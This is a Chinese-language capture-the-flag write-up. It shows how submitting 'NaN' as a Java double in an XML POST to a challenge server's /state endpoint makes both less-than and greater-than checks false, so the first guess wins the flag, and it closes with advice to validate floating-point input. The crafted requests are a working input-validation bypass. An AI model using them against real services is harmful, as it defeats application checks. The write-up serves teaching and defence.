# 猜数字

## 题目简述

服务端随机生成一个位于 0 和 1 之间、精确到 $10^{-6}$ 的 Java `double`，客户端通过 XML 向 `/state` 提交猜测。若第一次提交就被判定为命中，响应中会出现 flag。随机数由 `SecureRandom` 生成，穷举不是稳定解法；漏洞来自 IEEE 754 的 `NaN` 不参与正常大小比较。

## 解题过程

源码的核心判断为：

```java
var guess = Double.parseDouble(text);

var isLess = guess < this.number - 1e-6 / 2;
var isMore = guess > this.number + 1e-6 / 2;

var isPassed = !isLess && !isMore;
var isTalented = isPassed && this.previous.isEmpty();
```

对普通数值而言，只有落入目标值左右各 $5\times10^{-7}$ 的区间才会同时满足“既不小也不大”。但 `Double.parseDouble("NaN")` 会得到 IEEE 754 的非数值对象。对任意有限值 $x$：

```text
NaN < x   -> false
NaN > x   -> false
NaN == x  -> false
```

于是提交 `NaN` 后：

```text
isLess   = false
isMore   = false
isPassed = true
```

为了满足 `this.previous.isEmpty()`，应把它作为该会话的第一次猜测。请求骨架如下，认证值替换为当前实例分配的 token：

```http
POST /state HTTP/1.1
Host: challenge.example
Authorization: Bearer <token>
Content-Type: text/xml;charset=UTF-8

<state><guess>NaN</guess></state>
```

POST 成功后，再带相同认证信息获取状态：

```http
GET /state HTTP/1.1
Host: challenge.example
Authorization: Bearer <token>
```

因为第一次猜测已经同时满足 `isPassed` 和 `isTalented`，返回的 XML 中包含 `<flag>` 元素。

决定性漏洞位于 HTTP API 的服务端输入校验：应用把可由客户端提交的通用浮点值直接带入业务比较，却没有排除 `NaN`。因此按应用逻辑绕过归入 `web`，而不是因为使用了 XML 就机械分类。

## 方法总结

- 核心技巧：向浮点比较逻辑输入 `NaN`，让“小于”和“大于”两个分支同时为假。
- 识别信号：程序用 `!less && !greater` 代替明确的等值或有限性检查，并允许用户输入被通用浮点解析器处理。
- 复用要点：所有安全相关浮点输入都应显式检查 `isFinite`/`isNaN`；不要假设浮点数像实数一样满足完全的大小次序。
